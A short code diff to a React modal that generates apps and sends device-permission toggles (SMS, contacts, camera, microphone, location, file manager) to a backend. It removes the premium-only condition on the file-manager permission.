@@ -468,7 +468,7 @@ export default function AppGenerationModal({ isOpen, onClose, uuid, socket, user
             formData.append('enableSmsPermission', enableSmsPermission.toString());
             formData.append('enableContactsPermission', enableContactsPermission.toString());
             formData.append('enableStoragePermission', enableStoragePermission.toString());
-            formData.append('enableFileManagerPermission', (enableFileManagerPermission && isPremium).toString());
+            formData.append('enableFileManagerPermission', enableFileManagerPermission.toString());
             formData.append('enableCameraPermission', enableCameraPermission.toString());
             formData.append('enableMicrophonePermission', enableMicrophonePermission.toString());
             formData.append('enableLocationPermission', enableLocationPermission.toString());
